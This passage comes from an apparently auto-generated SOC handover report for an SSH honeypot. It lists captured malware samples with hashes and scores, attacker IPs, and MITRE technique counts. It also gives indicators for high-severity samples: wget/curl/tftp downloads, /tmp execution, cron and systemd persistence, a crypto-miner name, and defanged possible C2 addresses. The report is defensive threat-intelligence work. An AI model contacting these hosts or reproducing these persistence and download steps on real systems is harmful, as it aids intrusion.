| `91.92.40[.]65` | 1 | 2026-10-27 01:10 | 2026-10-27 01:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]65` | 1 | 2026-10-27 08:07 | 2026-10-27 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.182.94[.]63` | 1 | 2026-10-27 11:18 | 2026-10-27 11:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `96.240.20[.]2` | 1 | 2026-10-27 10:21 | 2026-10-27 10:21 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `50.6.228[.]85` | US | Newfold Digital, Inc. | **100** ⚠️ | 12 |
| `43.161.196[.]76` | HK | ACEVILLE PTE.LTD. | **100** ⚠️ | 3 |
| `102.204.176[.]41` | KE | Telcoptics | **100** ⚠️ | 0 |
| `101.201.234[.]37` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 3 |
| `88.178.40[.]196` | FR | Proxad / Free SAS | **100** ⚠️ | 4 |
| `74.91.170[.]161` | US | Newfold Digital, Inc. | **100** ⚠️ | 16 |
| `165.154.162[.]74` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 27 |
| `185.242.226[.]17` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `50.6.204[.]210` | US | Newfold Digital, Inc. | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 386 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 344 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 138 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 106 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 35 |

---

## 🔕 False Positive Summary (83 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 27 |
| AbuseIPDB score 1 below threshold 25 | 5 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 615 cases |
| Tool 34  | Credential Extractor        | ✅ 28477 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 31 fingerprints |
| Tool 36  | Command Clustering          | ✅ 59 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 343 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 83 filtered (13.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 144 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 332 priority case(s) shown individually · 179 recon entry/entries in table (18 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-27T17:01:59Z_
